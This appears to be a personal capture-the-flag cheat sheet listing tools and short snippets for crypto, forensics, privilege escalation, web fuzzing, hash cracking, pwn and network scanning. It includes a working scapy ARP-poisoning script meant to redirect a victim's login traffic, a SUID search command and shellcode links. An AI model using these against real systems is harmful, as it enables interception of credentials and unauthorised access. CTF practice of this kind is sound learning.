---
title: Capture The Flag
---

## Crypto
`dcode` is a very useful tool for decrypting various ciphers.
`pycrptodome` is a successor of the no longer mained `pycrypto`


### DH

Finding key:

```python
def brute_force_private_key(g, p, public_key):
    for x in range(p):
        if pow(g, x, p) == public_key:
            return x
    return None

# Parameters
p = 6123584726269
g = 12
A = 5433773864651

# Brute force private key 'a'
a = brute_force_private_key(g, p, A)
if a is not None:
    print(f"Private key a: {a}")
else:
    print("Private key not found.")
```

Finding secret:

```python
def brute_force_private_key(g, p, public_key):
    for x in range(p):
        if pow(g, x, p) == public_key:
            return x
    return None

# Parameters
g = 577
p = 12611
A = 6030
B = 8354

# Brute force private key 'a'
a = brute_force_private_key(g, p, A)
if a is not None:
    print(f"Private key a: {a}")

    # Compute the shared secret
    shared_secret = pow(B, a, p)
    print(f"Shared secret: {shared_secret}")
else:
    print("Private key not found.")
```

## Forensics
- `hex editor` (like `xxd`) is useful to analyze (binary) contents of a file
- `binwalk` allows to detect which type of a file a certain file is
- `pillow` (python) analyze and edit images
- [photo analyser](https://29a.ch/photo-forensics/#forensic-magnifier)
- [steganographic decoder](http://futureboy.us/stegano/decinput.html)


## Privilege Escape
- linPEAS for automated checking
- to check which binaries you can run with sudo `sudo -l`
- use https://gtfobins.github.io to find instructions how to exploit this binary
- find SUID bit set using "find / -perm -4000 -type f 2>/dev/null"

## Web
`Burp Suite` GUI tool to execute/modify HTTP requests
`requests` (python) sending requests in any format
`nikto` (https://github.com/sullo/nikto) for web server scanner
`bbot` (https://github.com/blacklanternsecurity/bbot) for web server scanner

### Finding hidden files/directories

```bash
docker run --rm hypnza/dirbuster -u https://website.com
```

Or with a [wordlist](https://github.com/xmendez/wfuzz/tree/master/wordlist):
```bash
docker run -v $(pwd)/wordlist:/wordlist/ -it ghcr.io/xmendez/wfuzz wfuzz -c -z file,/wordlist/list.txt --hc 404 https://website.com/FUZZ
```

## Reverse Engineering
`IDA Free` (statically) analyze binaries
`Ghidra` (statically) analyze programs

## Cracking hashes
Find hash type using https://hashcat.net/wiki/doku.php?id=example_hashes
Identify hashcat module for the hash type
`hashcat -m [module] hashes.txt wordlist.txt`
Or `hashcat -m [module] -a 0 hashes.txt wordlist.txt -o out.txt` (`-a 0` indicates we have a wordlist of potential passwords)

Or: https://crackstation.net/, https://hashes.com

## Pwn
`x64dbg` analyze a program at runtime
`pwndbg` is a `gdb` plugin that makes debugging suck less
`pwntools` (python imported via `pwn`) wide variety of tools for dealing with binaries. Also allows to connect to a TCP socket (aka netcat connection). [documentation](https://docs.pwntools.com/en/stable/intro.html#making-connections) and [cheatsheet](https://xavierholt.github.io/cheatsheets/pwntools.html)
Use `https://shell-storm.org/shellcode/files/shellcode-811.html` or `https://shell-storm.org/shellcode/files/shellcode-606.html` for shell codes (also see diff ones from that website)

```
The binary operates with both a real user ID (UID) and an effective user ID (EUID). Certain shells, when spawned from the binary, will drop their privileges if they detect a mismatch between the UID and EUID. This behavior is a security measure to prevent unintended privilege escalation. To maintain elevated privileges in such cases, consider using a shell which does not automatically do this or pass an argument that prevents the shell from doing this.
```

## CVE's
Find CVE's on https://www.exploit-db.com/

## ARP poisoning

Suppose victim (IP_V, MAC_V) is logging into a http website that is hosted on (IP_W, MAC_W)

Our goal is to trick the victim that the MAC address of the website is our own computer (MAC_O) MAC address, such that the login requests go to our computer instead of to the website.

We can do this using ARP poisoning, we send ARP "responses" to the victim, that say that MAC_O belongs to IP_W.

We can do this using scapy:

```
spoofed = eval("Ether(dst='MAC_V', src='MAC_O', type=2054)/ARP(hwtype=1, ptype=2048, hwlen=6, plen=4, op=2, hwsrc='MAC_O', psrc='IP_W', hwdst='MAC_V', pdst='IP_V')")
sendp(spoofed,iface="eth0",loop=1,inter=0.1)
```

The MAC addresses MAC_V, MAC_W can be found using:

```
from scapy.all import ARP, Ether, srp, conf

conf.verb = 0  # quiet
iface = "eth0"  # change interface
network = "192.168.0.0/24" # change subnet

arp = ARP(pdst=network)
eth = Ether(dst="ff:ff:ff:ff:ff:ff")
ans, _ = srp(eth/arp, iface=iface, timeout=2)

for snd, rcv in ans:
    print(f"{rcv.psrc} is at {rcv.hwsrc}")
```

And our own MAC address can be found using
```
ip a show eth0
```

## Other
`nmap -O ip` simple scan
`nmap -sT ip` simple TCP scan
`nmap -sU ip` simple UDP scan
`nmap --top-ports 1000 ip` scan top used ports
`nmap -n -PN -sT -sU -p- ip` scan for all tcp and udp ports
`Responder` for poisoning (faking "auth server")
